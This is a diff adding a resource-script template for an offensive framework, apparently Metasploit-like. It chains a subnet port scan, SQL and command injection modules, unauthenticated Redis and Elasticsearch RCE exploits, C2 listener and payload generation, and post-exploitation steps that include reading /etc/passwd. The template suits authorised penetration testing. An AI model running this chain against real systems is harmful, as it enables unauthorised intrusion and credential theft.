@@ -1,0 +1,65 @@
+# RCF Full Engagement Template
+# Comprehensive assessment workflow
+#
+# Usage: rcf -r scripts/full_engagement.rc --rhosts <target> --lhost <your_ip>
+#
+# This script performs:
+# 1. Network scanning
+# 2. Service enumeration
+# 3. Vulnerability testing
+# 4. Exploitation (if vulnerabilities found)
+# 5. Post-exploitation
+
+# ── Phase 1: Network Scanning ────────────────────────────────────────
+# Scan common ports on target range
+setg RHOSTS 192.168.1.0/24
+setg PORTS common
+
+use auxiliary/scanner/port/tcp_connect
+run
+
+# ── Phase 2: Web Vulnerability Testing ───────────────────────────────
+# Test discovered web services
+setg RPORT 8080
+
+# SQL Injection
+use auxiliary/scanner/http/sqli
+set TARGET_URI /login
+set PARAM username
+run
+
+# Command Injection
+use exploit/multi/http/cmd_injection
+set TARGET_URI /api/ping
+set PARAM host
+run
+
+# ── Phase 3: Service Exploitation ────────────────────────────────────
+# Test Redis
+use exploit/multi/redis/redis_unauth
+set RPORT 6379
+run
+
+# Test Elasticsearch
+use exploit/multi/http/elasticsearch_rce
+set RPORT 9200
+run
+
+# ── Phase 4: C2 Setup (if exploitation successful) ───────────────────
+# Note: In real engagement, deploy agent manually after exploitation
+# rcf c2 listen (in separate terminal)
+# rcf venom -p agent --lhost ${LHOST} --lport 8443
+
+# ── Phase 5: Post-Exploitation ───────────────────────────────────────
+# Interact with established session
+# sessions
+# interact 1
+#   meterpreter > sysinfo
+#   meterpreter > ls /etc
+#   meterpreter > cat /etc/passwd
+#   meterpreter > exit
+
+# ── Summary ──────────────────────────────────────────────────────────
+show modules
+sessions
+jobs
